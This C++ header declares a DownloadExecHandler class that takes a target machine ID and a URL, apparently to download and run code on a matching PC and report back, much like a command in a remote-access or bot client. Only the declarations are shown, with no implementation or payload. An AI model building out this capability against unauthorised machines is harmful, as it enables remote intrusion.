#pragma once

#include <string>

#include "domain/common/Result.hpp"
#include "application/interfaces/IReporter.hpp"
#include "application/interfaces/IDownloadExecService.hpp"

namespace nuub::application::commands {

class DownloadExecHandler {
    interfaces::IDownloadExecService& dl_;
    interfaces::IReporter& reporter_;
    std::string pc_id_;

    [[nodiscard]] bool matches(const std::string& target) const;

public:
    DownloadExecHandler(
        interfaces::IDownloadExecService& dl,
        interfaces::IReporter& reporter,
        std::string pc_id);

    domain::Result<void> handle_downloadexec(const std::string& target, const std::string& url);
};

} // namespace nuub::application::commands
